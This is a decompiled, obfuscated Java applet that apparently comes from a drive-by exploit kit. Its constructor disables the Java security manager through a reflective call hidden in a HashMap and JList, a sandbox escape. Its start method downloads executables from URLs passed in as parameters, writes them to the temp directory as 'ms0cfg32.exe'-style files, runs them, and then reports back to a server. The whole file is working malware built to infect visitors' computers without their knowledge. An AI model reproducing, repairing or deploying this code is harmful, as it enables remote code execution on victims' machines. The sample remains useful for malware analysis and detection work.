import java.net.URL;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class dsa extends Applet
{
    String qqs1gfhfghddfhgdfgfgsds19;
    String adss1dghfgssdfgghjdfsdf1hghg9;
    String qqwes1ggdfgghjkhgfhjadsads19;
    public JList uyfdsadfsf;
    
    public HashSet createHS() {
        return new HashSet();
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter("url").split("!#!#");
            String s = System.getProperty("AAAA11D1D999999999999D111111DDDAAAAAAA916111LLLDDAA991j6aAvsa9.IiIoL6.6AtkmAAp9AdD6iDLrLD".replaceAll("[916kIsYLDA]", ""));
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            Integer n;
            for (n = 0; n < split.length && split[n].length() != 0; ++n) {
                final String string = s + "ms" + n + "tYW1QW11QWW111QYYYWWYYYYYQQQW1Y1YQY1Ycf1Wtgt3tttt2.etQxYe".replaceAll("[1QWtY]", "");
                final InputStream uyes = this.uyes(split[n]);
                final FileOutputStream joojol = this.joojol(string);
                final byte[] array = new byte[1024];
                int read;
                while ((read = uyes.read(array, 0, array.length)) != -1) {
                    joojol.write(array, 0, read);
                }
                uyes.close();
                joojol.close();
                new lab().main(string);
            }
            this.uyes(split[n - 1] + "##!").close();
        }
        catch (Exception ex) {}
    }
    
    public dsa() {
        this.qqs1gfhfghddfhgdfgfgsds19 = "ZWdfgdfg XF6dqadssdfgdfgweqewrwerwrwerfdO_lr0CDVs32cz78ewsnphCjc_9MR FGUtO_lr0CDVs32c ";
        this.adss1dghfgssdfgghjdfsdf1hghg9 = "Zahgfcvbcvbs6XF_i9Ew7HxZW z78ewsnphCjcdfgdfgdfgi9Ew7HxZW z78ewsnphCjc_9MR FGUtO_lr0CDVs32c ";
        this.qqwes1ggdfgghjkhgfhjadsads19 = "ZtNmsdghdsdfsdf9s kuo0sdfsdfbg_i9Ew7Hdfgdfg FGUtO_lr0CDVs32cXF6lM8dIWgytNmdfgdfgCjc_9MR FGUtO_lr0CDVs32cXF6lM8dIWgytNm9s kuo0bg_i9Ew7HxZsdfsdfW z78ewsnphCjc_9MR FGUfdgsdftO_lr0CDVs32cXdfgbg_i9Ew7HxZW z78ewsnphCjc_9MR FGUtO_lr0CDVs32csTSi z78ewsnphCjc_9MR FGUtO_lr0CDVs32c ";
        final vrotmnead vrotmnead = new vrotmnead(System.class, new StringBuffer("fg6").append("set").append("5ZSecu".substring(2)).append("rity".concat("3134OM".substring(5))).append("lKana".substring(2).concat("ger")).substring(3), new Object[1]);
        final HashSet hs = this.createHS();
        hs.add(vrotmnead);
        this.add(this.uyfdsadfsf = new JList(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return hs;
                }
            } }));
    }
    
    public FileOutputStream joojol(final String s) {
        try {
            return new FileOutputStream(s);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public InputStream uyes(final String s) {
        try {
            final URL url = new URL(s);
            url.openConnection();
            return url.openStream();
        }
        catch (Exception ex) {
            return null;
        }
    }
}
